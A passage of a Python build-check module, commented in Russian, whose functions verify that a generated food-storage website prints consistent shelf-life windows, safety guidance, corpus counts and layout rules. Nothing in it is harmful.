                    % (pr.kind_title(it, st),
                       pr.human(hi, (st.get("units") or {}).get(key)),
                       pr.SHORTEST_IS[kind]))
            if unescape(want) not in vis:
                bad.append("%s: страница-выбор не называет, чем обернётся "
                           "кратчайшее окно (ждали «%s»)" % (p, want[:60]))
        if kind == "unsettled" and any(unescape(x) in vis
                                       for x in pr.LOOK_ALL):
            bad.append("%s: под «не решено» подставлен признак порчи рубрики"
                       % p)
        if len(bad) > 10:
            break
    # СЧЁТ СХОДИТСЯ. Корзин четыре, четвёртая — страницы без единого числа.
    hub = files.get("past-the-date/index.html")
    if hub is None:
        bad.append("страницы правила нет в выкладке")
    else:
        seen += 1
        hv = _visible(hub)
        want = ("Of the %d food pages on this site, %d lead with a safety "
                "limit, %d with a quality window and %d say the record does "
                "not settle it."
                % (len(prods), tally["safety"], tally["quality"],
                   tally["unsettled"]))
        if want not in hv:
            bad.append("правило печатает не тот счёт, ждали «%s»"
                       % want[:100])
        rest = len(prods) - sum(tally.values())
        if "The other %d print no single figure at all" % rest not in hv:
            bad.append("правило теряет %d страниц без единого числа" % rest)
    return (bad or _seen(seen, "вердиктов, объяснений и счёта правила"))[:8]


# --------------------------------------------- за страницу отвечает ВЕДУЩЕЕ
#
# Известные ответы: какое состояние человек имеет в виду, набирая простое имя
# продукта. Написаны РУКАМИ, по словам самого источника, и держатся отдельно
# от лестницы, которая их выбирает.
# ИЗВЕСТНЫЕ ОТВЕТЫ объявленной таблицы значений простого слова. Написаны
# РУКАМИ и глазами: правило «за страницу говорит тот вид, который человек
# имеет в виду» не выводится ни из какой формулы, и проверять его можно
# только назвав ответ. None значит «говорить некому»: простое слово покрывает
# несколько видов, и страница печатает выбор вместо числа.
_NOBODY = None

_LEAD_ANSWERS = (
    ("eggs", "in shell"),
    ("fish", "raw but headed and gutted"),
    ("bacon", ""),
    ("leftovers", "with meat, fish, poultry, or egg"),
    ("quinoa", "uncooked"),
    ("jerky", "commercially dried"),
    ("popcorn", "dry kernels in jar"),
    ("spaghetti-squash", "whole"),
    # Ответы, которых словесная лестница не давала, — за них и был аудит:
    # она брала первую строку, не сужающую продукт, и промахивалась там, где
    # простое слово ЗНАЧИТ именно суженный вид.
    ("tuna", "canned"),
    ("orange-juice", "commercially packaged carton"),
    ("sugar", "granulated"),
    ("peanut-butter", "commercial"),
    ("milk", "plain or flavored"),
    ("olives", "black and green"),
    ("mung-bean", "dry, food-grade bags"),
    ("garlic", ""),
    ("herbs", ""),
    # Простое слово не значит одного вида: говорить за страницу некому.
    ("beef", _NOBODY),
    ("ham", _NOBODY),
    ("pies", _NOBODY),
    ("cheese", _NOBODY),
    ("cream", _NOBODY),
)


def g_lead_state_speaks_for_the_page(files):
    """За страницу говорит тот вид, который человек и набрал.

    Страница /eggs/ отвечала «2 days to 4 days» со штампом «выброси не
    пробуя»: это сырые белки и желтки. Яйца В СКОРЛУПЕ — то самое, что
    человек держит в руке, набирая слово eggs, — тот же источник держит
    три-пять НЕДЕЛЬ. Значение простого слова из подзаголовка не выводится
    никаким правилом (словесная лестница промахнулась на тринадцати
    страницах), поэтому оно ОБЪЯВЛЕНО в fk.PLAIN_MEANS, а здесь проверено.

    Пять вещей, и ни одна не спрашивает у таблицы, что она выбрала:

      1. ведущих видов не больше одного, и он среди видов продукта;
      2. объявленный ключ есть среди строк ИМЕНИ В ИСТОЧНИКЕ, а помеченный
         ведущим — ровно он: таблица не может назвать чужую строку, а новый
         снимок не может сдвинуть выбор молча;
      3. НАПЕЧАТАННОЕ: подпись сигнального поля называет ведущий вид, и
         сигнальное окно взято из его ячеек;
      4. вид, кончающийся раньше ведущего, назван на странице;
      5. у страницы-выбора сигнального поля нет вовсе.

    Известные ответы самой таблицы — в _LEAD_ANSWERS выше.
    """
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    raw = {}
    for r in fk.load():
        raw.setdefault(r["name"].strip().lower(), []).append(r)
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        it = by.get(p.split("/")[0])
        if not it:
            continue
        sts = pr.states_of(it)
        leads = [st for st in sts if st.get("lead")]
        seen += 1
        if len(leads) > 1:
            bad.append("%s: ведущих видов %d" % (p, len(leads)))
            continue
        if not leads:
            # Страница-выбор. Ей полагается поле выбора и ни одного
            # сигнального поля: молча выбранный вид — это и был дефект.
            if not it.get("split"):
                bad.append("%s: ведущего вида нет, а страница не объявлена "
                           "страницей-выбором" % p)
            if 'class="hot" data-pick' not in t:
                bad.append("%s: страница-выбор без поля выбора" % p)
            if re.search(r'<div class="hot"><div class="cap">', t):
                bad.append("%s: у страницы-выбора есть сигнальное поле" % p)
            continue
        lead = leads[0]
        # Объявленный ключ сверяется С ИСТОЧНИКОМ, а не с корпусом: строка,
        # которой в снимке нет, обязана ронять сборку, а не тихо сдвигать
        # выбор на соседнюю.
        rows = raw.get(it["name"].strip().lower()) or []
        if len(rows) > 1:
            want = fk.PLAIN_MEANS.get(it["name"].strip().lower())
            if lead.get("id") != want:
                bad.append("%s: объявлена строка %s, а ведущей помечена %s"
                           % (p, want, lead.get("id")))
        cell = _signal_cell(it)
        if not cell:
            if _no_signal_reason(it) and 'class="hot" data-pick' not in t:
                bad.append("%s: сигнального окна нет по правилу, а поля "
                           "выбора тоже нет" % p)
            continue
        _i, st, key, lo, _hi = cell
        if st.get("id") != lead.get("id"):
            bad.append("%s: сигнальное окно взято не у ведущего вида" % p)
        if len(sts) > 1:
            m = re.search(r'<div class="hot"><div class="cap">(.*?)</div>', t,
                          re.S)
            want = pr.short_kind(pr.kind_title(it, lead))
            if not m:
                bad.append("%s: у сигнального поля нет подписи" % p)
            elif unescape(want) not in unescape(m.group(1)):
                bad.append("%s: подпись сигнального поля называет не ведущий "
                           "вид (%s)" % (p, unescape(m.group(1))[:40]))
            other = pr.shortest_other_state(it)
            if other and other[2] < lo:
                seen += 1
                vis = _visible(t)
                num = unescape(pr.human(other[2],
                                        (other[0].get("units") or {}).get(
                                            other[1])))
                nm = unescape(pr.kind_title(it, other[0]))
                if nm not in vis or num not in vis:
                    bad.append("%s: вид с более коротким окном (%s, %s) не "
                               "назван на странице" % (p, nm, num))
        if len(bad) > 10:
            break
    # Таблица не должна помнить имён, которых в снимке больше нет. С другой
    # стороны её держит сама сборка: имя с несколькими строками и без
    # объявления роняет fk.plain_row, — а вот протухшую строку не заметил бы
    # никто, и через один снимок она объявляла бы значение слова, которого
    # на сайте нет.
    names = {}
    for r in fk.load():
        names[r["name"].strip().lower()] = names.get(
            r["name"].strip().lower(), 0) + 1
    stale = sorted(set(fk.PLAIN_MEANS) - {k for k, n in names.items()
                                          if n > 1})
    if stale:
        bad.append("объявлено значение простого слова для имени, которого в "
                   "снимке нет одной строкой: %s" % ", ".join(stale[:3]))
    # Известные ответы в ВЫБОРКУ не идут — по той же причине, что и пары
    # ситуаций в соседнем гейте: выборка здесь измеряется страницами.
    for slug, kind in _LEAD_ANSWERS:
        it = by.get(slug)
        if not it:
            bad.append("известный ответ потерял продукт: %s" % slug)
            continue
        lead = [st for st in pr.states_of(it) if st.get("lead")]
        got = (lead[0].get("kind") or "") if lead else None
        if kind is None:
            if got is not None:
                bad.append("за %s говорить некому, а говорит «%s»"
                           % (slug, got))
        elif got is None:
            bad.append("за %s должен говорить «%s», а не говорит никто"
                       % (slug, kind))
        elif got.strip() != kind:
            bad.append("ведущий вид %s: ожидалось «%s», выбрано «%s»"
                       % (slug, kind, got))
    return (bad or _seen(seen, "страниц и известных ответов"))[:8]


# Фраза, которой страница объясняет ВЫБОР ВИДА, и слова, которых на странице
# продукта не должно быть вовсе: три разных предложения утверждали, что за
# страницу отвечает первая строка источника, и на тринадцати страницах это
# было просто неверно.
_SPEAKS_RE = re.compile(
    r"computed for (.+?), which is the kind the plain name means here")
_SPLIT_SENT = "so this page prints no single figure"
_FIRST_ROW_WORDS = ("the source lists first", "the row the source lists",
                    "the entry the source lists")


def _window_owners(it, vis):
    """{позиция в видимом тексте: {id вида}} для КАЖДОГО напечатанного окна.

    Берутся обе формы, которыми окно печатается на сайте: полный размах
    («3 weeks to 5 weeks») и осторожный край («2 days»), потому что ремень
    безопасности печатал именно край — и именно краем обгонял ответ.
    """
    out = {}
    for st in pr.states_of(it):
        for key, _f, _l in fk.SLOTS:
            v = st["slots"].get(key)
            if not v or v[0] == "no":
                continue
            u = (st.get("units") or {}).get(key)
            for s in {unescape(pr.st_text(st, key)),
                      unescape(pr.human(v[0], u))}:
                i = vis.find(s)
                if i >= 0:
                    out.setdefault(i, set()).add(st.get("id"))
    return out


def g_choice_matches_the_state(files):
    """Сказанное о выборе вида СОВПАДАЕТ с видом, который говорит.

    Страница печатала «comparisons are computed for the row the source lists
    first» и считала их по ДРУГОЙ строке: тринадцать страниц несли фразу,
    которую опровергал их же собственный раздел «The record this page is
    built from». И вторая половина того же дефекта: ремень безопасности —
    более короткое окно другого вида — стоял подписью ПОД ИМЕНЕМ ПРОДУКТА,
    то есть первым числом страницы /eggs/ были два дня сырого белка.

    Четыре вопроса, и все — к НАПЕЧАТАННОМУ:

      1. слов «первая строка источника» на странице продукта нет нигде;
      2. у страницы с несколькими видами фраза о выборе есть, и она одна:
         либо она называет вид, либо говорит, что называть некого;
      3. вид, названный ФРАЗОЙ, назван и подписью поля наверху страницы —
         два напечатанных места, сверенные друг с другом, а не с функцией,
         которая выбор сделала;
      4. ПЕРВОЕ окно в видимом тексте принадлежит тому виду, за который
         страница говорит (у страницы-выбора — самому короткому из её
         видов): оговорка стоит ПОСЛЕ ответа, а не перед ним.
    """
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        it = by.get(p.split("/")[0])
        if not it:
            continue
        vis = _main_text(t)
        if vis is None:
            bad.append("%s: главного элемента нет" % p)
            continue
        seen += 1
        for w in _FIRST_ROW_WORDS:
            if w in vis:
                bad.append("%s: страница всё ещё обещает «%s»" % (p, w))
        sts = pr.states_of(it)
        if len(sts) < 2:
            if _SPEAKS_RE.search(vis) or _SPLIT_SENT in vis:
                bad.append("%s: у продукта один вид, а фраза о выборе есть"
                           % p)
            continue
        said = {m.strip() for m in _SPEAKS_RE.findall(vis)}
        split = it.get("split")
        if split:
            if said:
                bad.append("%s: страница-выбор называет вид «%s»"
                           % (p, sorted(said)[0][:40]))
            if _SPLIT_SENT not in vis:
                bad.append("%s: страница-выбор не говорит, почему числа нет"
                           % p)
        else:
            if not said:
                bad.append("%s: страница не говорит, за какой вид отвечает"
                           % p)
                continue
            if len(said) > 1:
                bad.append("%s: фразы о выборе называют разные виды: %s"
                           % (p, ", ".join(sorted(said))[:60]))
                continue
            name = sorted(said)[0]
            m = re.search(r'<div class="hot"[^>]*><div class="cap">(.*?)'
                          r'</div>', t, re.S)
            if not m:
                bad.append("%s: фраза о выборе есть, а поля наверху нет" % p)
                continue
            cap = unescape(m.group(1))
            if unescape(pr.short_kind(name)) not in cap:
                bad.append("%s: фраза говорит за «%s», а поле наверху "
                           "названо «%s»" % (p, name[:40], cap[:40]))
        # Четвёртое: чьё окно встречено первым.
        owners = _window_owners(it, vis)
        if not owners:
            continue
        first = min(owners)
        if split or _no_signal_reason(it):
            band = [(v[0], v[1], st.get("id"))
                    for st in sts
                    for k in [fk.shelf_key(st)] if k
                    for v in [st["slots"][k]]]
            if band and min(band)[2] not in owners[first]:
                bad.append("%s: первым окном страницы-выбора стоит не самое "
                           "короткое" % p)
        elif ([st for st in sts if st.get("lead")][0].get("id")
              not in owners[first]):
            bad.append("%s: первым окном страницы стоит окно чужого вида" % p)
        if len(bad) > 10:
            break
    return (bad or _seen(seen, "страниц продуктов"))[:8]


def g_now_what_is_answered(files):
    """На каждой странице товара сказано, ЧТО ДЕЛАТЬ, когда срок вышел.

    Самый дорогой запрос ниши — «срок вышел», «простояло ночь», «а теперь
    что», — и сайт не отвечал на него ничем: «Past it by 6 days», и тишина.
    Ни «выбросить», ни «не пробовать», ни правила двух часов на 242 страницах.
    Отсутствие ответа выглядит как зелёная сборка, поэтому гейт требует его
    ПРИСУТСТВИЯ, а вид указания пересчитывает сам.

    Признак порчи проверяется с ОБЕИХ сторон: под окном качества обязан стоять
    признак СВОЕЙ рубрики, и не должно стоять ни одного признака чужой. Прежде
    фраза была одна на всех, и «банка вздулась, помята или проржавела» стояло
    на 133 страницах без единой банки. Рубрику гейт берёт у продукта сам и
    смотрит в объявленную ТАБЛИЦУ prose.LOOK_BY_CAT, а не спрашивает у
    функции, которая эту фразу и выбрала: гейт, согласный сам с собой,
    остаётся зелёным и после того, как сломают выбор.
    """
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        it = by.get(p.split("/")[0])
        if not it:
            continue
        cell = _signal_cell(it)
        if not cell:
            continue
        seen += 1
        _i, _st, key, _lo, hi = cell
        kind = _kind_of(it, key, hi, _st)
        vis = _visible(t)
        if unescape(pr.NOW_WHAT_HEAD) not in vis:
            bad.append("%s: раздела «что теперь» нет" % p)
            continue
        if '<a href="/past-the-date/">' not in t:
            bad.append("%s: некуда пойти за полным правилом" % p)
        own_look = pr.LOOK_BY_CAT.get(it["category"])
        if own_look is None:
            bad.append("%s: у рубрики %s нет признака порчи"
                       % (p, it["category"]))
            continue
        others = [x for x in pr.LOOK_ALL if x != own_look]
        if kind == "safety":
            if unescape(pr.DISCARD_NOW) not in vis:
                bad.append("%s: предел безопасности без указания выбросить"
                           % p)
            if any(unescape(x) in vis for x in pr.LOOK_ALL):
                bad.append("%s: под пределом безопасности предложено "
                           "смотреть и решать" % p)
        elif kind == "unsettled":
            # Нерешённому случаю положено СВОЁ указание, и признак порчи из
            # рубрики под него не идёт: «посмотри и реши» рядом с «может
            # быть, это предел» — две рамки на одно последствие, а читатель
            # выберет ту, которая разрешает. Своя фраза называет опасную
            # сторону первой и внутри себя.
            if unescape(pr.UNSETTLED_NOW_WHAT) not in vis:
                bad.append("%s: «не решено» без своего указания" % p)
            if any(unescape(x) in vis for x in pr.LOOK_ALL):
                bad.append("%s: под «не решено» подставлен признак порчи "
                           "рубрики" % p)
        else:
            if unescape(own_look) not in vis:
                bad.append("%s: окно качества без того, по чему судить" % p)
            wrong = [x for x in others if unescape(x) in vis]
            if wrong:
                bad.append("%s: признак порчи не от своей рубрики (%s)"
                           % (p, wrong[0][:40]))
        # Нижний предел от рубрики берётся ТОЛЬКО у еды, которую источник
        # вообще держит холодной НА КОРОТКИХ ЧАСАХ: сухое молоко и соевый
        # белок лежат в молочной рубрике, но правило двух часов написано не
        # про порошок — и не про топлёное масло, которому та же рубрика даёт
        # два года в холодильнике. Длина берётся объявленным порогом: окно
        # длиннее него не бывает пределом безопасности, а значит, и еда под
        # ним не та, ради которой писали правило двух часов.
        cold = any(k2.startswith("fridge") and v2[0] != "no"
                   and v2[1] is not None
                   and v2[1] <= fk.SAFETY_LIMIT_MAX_DAYS
                   for s2 in pr.states_of(it)
                   for k2, v2 in s2["slots"].items())
        if unescape(pr.TWO_HOUR) not in vis and (
                kind == "safety" or (it["category"] in _PERISHABLE and cold)):
            bad.append("%s: скоропортящееся без правила двух часов" % p)
    return (bad or _seen(seen, "страниц товара"))[:8]


def g_std_is_declared(files):
    """Помеченная общая фраза — только из объявленного банка, и обратно.

    Указание по безопасности обязано звучать ОДИНАКОВО везде, где стоит, а
    гейт близнецов считает пятёрки слов и роняет за это корпус. Поэтому общие
    фразы помечены `<span data-std>` и не участвуют в сравнении. Пометка
    закрыта с ОБЕИХ сторон, иначе она была бы дырой в гейте близнецов:

      · внутри пометки — только фраза из prose.STD_BANK;
      · фраза из банка, напечатанная ВНЕ пометки, — тоже провал: она бы
        вернулась в сравнение и тихо уронила страницу;
      · объявленная и нигде не напечатанная фраза — рычаг, которого нет;
      · и потолок доли: страница, набранная общей фразой больше чем на треть,
        и есть та самая страница-шаблон, ради которой гейт близнецов писался.
    """
    bank = {pr.plain_text(x) for x in pr.STD_BANK}
    bad, used, seen = [], set(), 0
    for p, t in sorted(_html(files).items()):
        spans = re.findall(r"<span data-std>(.*?)</span>", t, re.S)
        if not spans:
            continue
        seen += 1
        vis = _visible(t)
        for sp in spans:
            plain = pr.plain_text(sp)
            if plain not in bank:
                bad.append("%s: под пометкой не объявленная фраза «%s»"
                           % (p, plain[:48]))
            else:
                used.add(plain)
        for phrase in bank:
            outside = _visible(re.sub(r"<span data-std>.*?</span>", " ", t,
                                      flags=re.S))
            if unescape(phrase) in outside:
                bad.append("%s: общая фраза напечатана без пометки «%s»"
                           % (p, phrase[:48]))
                break
        n_all = len(re.findall(r"[A-Za-z][A-Za-z'-]*", vis))
        n_std = sum(len(re.findall(r"[A-Za-z][A-Za-z'-]*",
                                   _visible(sp))) for sp in spans)
        if n_all and n_std * 3 > n_all:
            bad.append("%s: общая фраза занимает %d%% видимого текста"
                       % (p, round(100.0 * n_std / n_all)))
    missing = sorted(bank - used)
    if missing:
        bad.append("объявлено и нигде не напечатано: «%s»" % missing[0][:48])
    return (bad or _seen(seen, "помеченных общих фраз"))[:8]


def g_scope_is_named(files):
    """Отношение, чьи стороны — разная готовность, названо таковым.

    «26× · 360 days frozen ÷ 14 days sealed» у картошки сравнивало сырую
    холодильную с варёной мороженой: источник об этом СКАЗАЛ своей подсказкой
    («Freezer timeline applies to cooked and mashed potatoes»), а страница
    молчала. Гейт ищет подсказку сам и требует, чтобы её слова стояли на
    странице рядом с числом.
    """
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        it = by.get(p.split("/")[0])
        if not it:
            continue
        hr = pr.headline_ratio(it)
        if not hr:
            continue
        fams = {hr[1].den_key.split("_")[0], hr[1].num_key.split("_")[0]}
        notes = [x for st in pr.states_of(it)
                 for k, x in sorted((st.get("tips") or {}).items())
                 if re.search(r"\bapplies\b", x, re.I)
                 and k.split("_")[0] in fams]
        if not notes:
            continue
        seen += 1
        vis = _visible(t)
        at = vis.find(pr.SCOPE_HEAD)
        if at < 0:
            bad.append("%s: кратность через смену готовности, и это не "
                       "сказано" % p)
        # Цитата ищется В САМОМ разделе, а не где-нибудь на странице:
        # та же подсказка стоит ниже прозой в «What the USDA adds in
        # words», и по всей странице проверка нашла бы её там и
        # осталась зелёной.
        elif notes[0].rstrip(".") not in vis[at:at + 720]:
            bad.append("%s: оговорка источника не процитирована рядом "
                       "с числом" % p)
    return (bad or _seen(seen, "суженных отношений"))[:8]


def g_no_freeze_is_explained(files):
    """«Не рекомендуется» не оставлено без объяснения и без выхода.

    33 страницы утверждали «the freezer is not an option» и добавляли «there
    is no colder option to fall back on» — ни почему, ни что делать вместо.
    Причины источник не даёт, и выдумать её нельзя; но сказать, чем этот
    приговор ТОЧНО не является, можно, и это единственное, что читателю тут
    поможет.
    """
    bad, seen = [], 0
    why = unescape(pr.NOT_RECOMMENDED_WHY)
    for p, t in sorted(_products(files).items()):
        vis = _visible(t)
        if "marks the freezer as not recommended" not in vis:
            continue
        seen += 1
        if why not in vis:
            bad.append("%s: приговор морозилке без объяснения" % p)
        if "no colder option" in vis:
            bad.append("%s: сказано, что делать нечего" % p)
    return (bad or _seen(seen, "страниц с запретом морозилки"))[:8]


def plural_ru(n):
    """«1 страница» / «2 страницы» / «5 страниц» — сообщение гейта читает
    человек, и «1 страниц» в нём стоило бы доверия к остальному тексту."""
    tail = "страниц"
    if n % 10 == 1 and n % 100 != 11:
        tail = "страница"
    elif n % 10 in (2, 3, 4) and n % 100 not in (12, 13, 14):
        tail = "страницы"
    return "%d %s" % (n, tail)


def g_home_superlative(files):
    """Превосходная степень главной не спорит ни с одной страницей.

    «The largest gain in the whole data set belongs to Corn on the cob: 120
    times» опровергалось пятью собственными страницами, печатавшими 180×,
    240×, 720× и 1080× под той же подписью. Величина в превосходной степени
    считается ПО ТОМУ ЖЕ множеству и ТОЙ ЖЕ функцией, что и на страницах.
    """
    t = _html(files).get("index.html")
    if t is None:
        return ["главной нет в сборке"]
    # ДВЕ ФОРМЫ УТВЕРЖДЕНИЯ, И ОБЕ ОБЯЗАНЫ ПРОВЕРЯТЬСЯ. Единоличный чемпион
    # и объявленная НИЧЬЯ — разные заявления, и раньше гейт знал только
    # первое: как только главная научилась печатать ничью, он перестал
    # находить утверждение вовсе (и честно покраснел, а не промолчал).
    m = re.search(r"largest of those freezer gains on this site "
                  r"(?:belongs to <a href=\"/[^/\"]+/\">[^<]*</a>: "
                  r"([0-9.]+) times"
                  r"|is shared by .{0,200}?, each ([0-9.]+) times)", t, re.S)
    if not m:
        return ["на главной нет утверждения о наибольшем выигрыше заморозки"]
    shared = m.group(2) is not None
    claim = float(m.group(1) or m.group(2))
    bad, seen, at_top = [], 0, 0
    for p, page in _products(files).items():
        x = re.search(r'<div class="cost"><div class="x">([0-9.]+)&times;'
                      r'</div><div class="t">(.*?)<span', page, re.S)
        if not x or "freezer buys" not in x.group(2):
            continue
        seen += 1
        v = float(x.group(1))
        if v > claim + 0.05:
            bad.append("%s: страница печатает %s, главная обещает %s как "
                       "наибольшее" % (p, x.group(1), m.group(1) or m.group(2)))
        elif abs(v - claim) < 0.05:
            at_top += 1
    # НИЧЬЯ — НЕ ПЕРВОЕ МЕСТО, и это вторая сторона того же вопроса. Сайт
    # печатает на всех карточках правило «identical ranges share a place
    # rather than being ordered arbitrarily», а главная объявляла
    # единоличным чемпионом Chicken при равном выигрыше у Shrimp: её же
    # рейтинг по одному клику показывал сверху другую еду.
    if shared and at_top < 2:
        bad.append("главная объявляет ничью, а %g× печатает %s"
                   % (claim, plural_ru(at_top)))
    if not shared and at_top > 1:
        bad.append("главная называет единственного чемпиона, а %g× печатает "
                   "%s" % (claim, plural_ru(at_top)))
    return (bad or _seen(seen, "страниц с выигрышем заморозки"))[:8]


# Утверждения о КОРПУСЕ, которые печатает проза, и предикат, по которому
# каждое обязано считаться. Пока счёт брался по «набору мест», а фраза
# говорила «нет срока в кладовой», число было верным и отвечало на более
# узкий вопрос, чем задан: 63 страницы обещали 132 при 222.
#
# Третий столбец — обязана ли фраза вообще встретиться в сборке. У ветки
# «только морозилка» он False, и это не поблажка: продукт без единого срока
# вне морозилки не проходит правило входа и страницы не получает вовсе, так
# что ветка недостижима по построению, а не потеряна.
CORPUS_CLAIMS = (
    (r"no pantry figure exists for it, as for (\d+) of the (\d+) foods in "
     r"the data that get no pantry time at all",
     lambda ctx: ctx["no_place"]["pantry"], True,
     "нет срока в кладовой"),
    (r"skips the refrigerator entirely, one of (\d+) foods of the (\d+) "
     r"that get no refrigerator time",
     lambda ctx: ctx["no_place"]["fridge"], True,
     "нет срока в холодильнике"),
    (r"which only (\d+) of the (\d+) foods in the data manage",
     lambda ctx: ctx["patterns"].get(("freeze", "fridge", "pantry"), 0), True,
     "рассмотрены все три места"),
    (r"storage time, as it does for (\d+) of the (\d+) foods the USDA lists",
     lambda ctx: ctx["patterns"].get(("fridge",), 0), True,
     "только холодильник"),
    (r"in the pantry and nowhere else, one of (\d+) foods of the (\d+) it "
     r"files that way",
     lambda ctx: ctx["patterns"].get(("pantry",), 0), True,
     "только кладовая"),
    (r"a time for, which it does for (\d+) of (\d+) foods",
     lambda ctx: ctx["patterns"].get(("freeze",), 0), False,
     "только морозилка"),
    (r"the pattern behind (\d+) of the (\d+) foods in the data",
     lambda ctx: ctx["patterns"].get(("fridge", "pantry"), 0), True,
     "кладовая и холодильник"),
)


def g_count_answers_its_claim(files):
    """Число отвечает НА ТОТ вопрос, который задан словами рядом с ним.

    «no pantry figure exists for it, as for 132 of the 466 foods» — 132 было
    числом продуктов с набором РОВНО {холодильник, морозилка}, а фраза
    говорила «нет срока в кладовой», и таких вдвое больше. Число было верным
    и отвечало на более узкий вопрос, чем произнесено: 63 страницы.

    Гейт пересчитывает КАЖДОЕ такое утверждение по его собственному предикату
    и требует, чтобы объявленное утверждение вообще встретилось в сборке:
    переписанная фраза, мимо которой проверка стала промахиваться, — это
    гейт, переставший запускаться.
    """
    import render as rd
    _items, _ranks, ctx = rd.load_corpus()
    bad, seen = [], 0
    for pat, want, must, what in CORPUS_CLAIMS:
        rx = re.compile(pat)
        found = 0
        for p, t in sorted(_products(files).items()):
            for m in rx.finditer(_visible(t)):
                found += 1
                seen += 1
                if int(m.group(1)) != want(ctx):
                    bad.append("%s: «%s» обещает %s, а по предикату %d"
                               % (p, what, m.group(1), want(ctx)))
                if int(m.group(2)) != ctx["total"]:
                    bad.append("%s: «%s» считает из %s, а в корпусе %d"
                               % (p, what, m.group(2), ctx["total"]))
                if len(bad) > 8:
                    return bad
        if must and not found:
            bad.append("утверждение «%s» не найдено ни на одной странице: "
                       "фразу переписали, а проверку — нет" % what)
    return (bad or _seen(seen, "утверждений о корпусе"))[:8]


def g_name_rows_match_source(files):
    """Строка с ИМЕНЕМ чужого продукта печатает ЕГО величину.

    Блоки глубины называют другие продукты и печатают их окна. Ссылки в этих
    строках нет намеренно, а гейт строк списка читает только `<li><a href>` —
    то есть эти четыреста строк на страницу не проверял бы никто. Список
    объявлен пометкой `data-names`, и сверка идёт в ОБЕ стороны: имя обязано
    принадлежать продукту корпуса, величина — быть ровно той, что печатает
    answer_value для него.
    """
    import prose as pr
    import render as rd
    items, _ranks, _ctx = rd.load_corpus()
    by_name = {}
    for x in items:
        by_name.setdefault(pr.esc(pr.short_of(x)), []).append(x)
    bad, seen = [], 0
    rows_rx = re.compile(r'<ul class="rows" data-names="1">(.*?)</ul>', re.S)
    # ВЕЛИЧИН В СТРОКЕ ДВЕ, и проверяются обе. Блок сравнения ведёт той
    # величиной, по которой шёл отбор, а осторожный ответ печатает под ней
    # второй строкой; пока шаблон читал только простой текст, строка с
    # двумя величинами не совпадала вовсе, и гейт объявлял список пустым
    # вместо того, чтобы проверить его.
    li_rx = re.compile(r'<li><span class="rk">([^<]*)</span>'
                       r'<span class="rv">([^<]*?)'
                       r'(?:<small>([^<]*)</small>)?</span></li>')
    for p, t in sorted(_products(files).items()):
        own = "/" + p[:-len("index.html")]
        for block in rows_rx.findall(t):
            rows = li_rx.findall(block)
            if not rows:
                bad.append("%s: объявленный список имён пуст" % p)
                continue
            for name, val, note in rows:
                seen += 1
                cand = by_name.get(name)
                if not cand:
                    bad.append("%s: имени «%s» нет в корпусе" % (p, name))
                    continue
                # Ведущая величина — либо осторожный ответ, либо та, по
                # которой блок сравнивает; обе берутся у продукта, и обе
                # обязаны совпасть с посчитанным здесь заново.
                want = {pr.esc(pr.answer_line(x)) for x in cand}
                want |= {pr.esc(pr.shelf_h(x)) for x in cand}
                want |= {pr.esc(pr.listing_parts(x)[0]) for x in cand}
                if val not in want:
                    bad.append("%s: у «%s» напечатано «%s», а источник даёт "
                               "«%s»" % (p, name, val, sorted(want)[0]))
                if note:
                    note_ok = ({pr.esc(pr.answer_line(x)) for x in cand}
                               | {pr.esc(pr.listing_parts(x)[1]) for x in cand})
                    if note not in note_ok:
                        bad.append("%s: вторая величина «%s» у «%s» ниоткуда "
                                   "не выведена" % (p, note, name))
                if any("/%s/" % x["slug"] == own for x in cand):
                    bad.append("%s: страница названа среди чужих имён" % p)
                if len(bad) > 8:
                    return bad
    return (bad or _seen(seen, "строк с именем"))[:8]


def g_li_in_a_list(files):
    """Ни одной строки списка ВНЕ списка.

    448 таких `<li>` стояли на 221 странице из 221: блок «Turning the range
    into a date» склеивал поля и строки без обёртки `<ul class="rows">`, и
    браузер рисовал их СТАНДАРТНЫМИ маркерами-точками — без пунктирной
    линейки, без правого края величины, без выключки. Главный приём облика
    («строки бланка вместо таблиц») был сломан на каждой странице товара, в
    обеих темах, на всех ширинах, при тридцати зелёных проверках: ни одна из
    них не читала ВЛОЖЕННОСТЬ.

    Пустая выборка — провал: разметка без единой строки списка означает, что
    гейт смотрит не туда.
    """
    bad, seen = [], 0
    for p, t in sorted(_html(files).items()):
        depth, n = 0, 0
        for m in re.finditer(r"<(/?)(ul|ol|menu|li)\b", t):
            close, tag = m.group(1), m.group(2).lower()
            if tag in ("ul", "ol", "menu"):
                depth = max(0, depth - 1) if close else depth + 1
            elif not close:
                n += 1
                if depth == 0:
                    bad.append("%s: строка списка вне списка" % p)
        seen += n
    return (bad or _seen(seen, "строк списка в сборке"))[:8]


# Свойства, которые ЕСТЬ ОТСТУП. Ширины и высоты сюда не входят: у рекламной
# единицы размер задан сетью, а не нами.
_SPACE_PROPS = ("padding", "padding-top", "padding-bottom", "padding-left",
                "padding-right", "margin", "margin-top", "margin-bottom",
                "margin-left", "margin-right", "gap", "row-gap", "column-gap",
                "top", "bottom", "left", "right")
_SPACE_OK = ("0", "auto", "100%", "-9999px")


def g_spacing_from_one_unit(files):
    """Каждый отступ выведен из ОДНОЙ базовой величины.

    Разбор облика насчитал здесь 13 разных значений отступа (2, 3, 4, 6, 7,
    8, 9, 10, 11, 12, 13, 14, 24) и шесть разных `margin-top` (3, 4, 6, 8, 9,
    10), не выведенных ни из чего: «шесть вертикальных ритмов в одной
    колонке, шатающихся на 1–3px от полосы к полосе». Единственная база —
    `--u`, и всё остальное есть `calc(var(--u)*n)` при целом n.

    Проверяется и сама база: `--pad` и `--rad` обязаны быть выведены из неё,
    иначе «одна база» распадается на три.
    """
    import design
    css = design.strip_comments(design.CSS) + design.strip_comments(
        design.AD_CSS)
    root = design._root_vars(design.CSS)
    bad = []
    if not root.get("--u", "").endswith("px"):
        bad.append("базовая величина --u не объявлена числом")
    for name in ("--pad", "--rad"):
        v = root.get(name, "")
        if not re.match(r"^calc\(var\(--u\)\*\d+\)$", v):
            bad.append("%s не выведен из базы: «%s»" % (name, v))
    derived = ("var(--u)", "var(--pad)", "var(--rad)")
    seen = 0
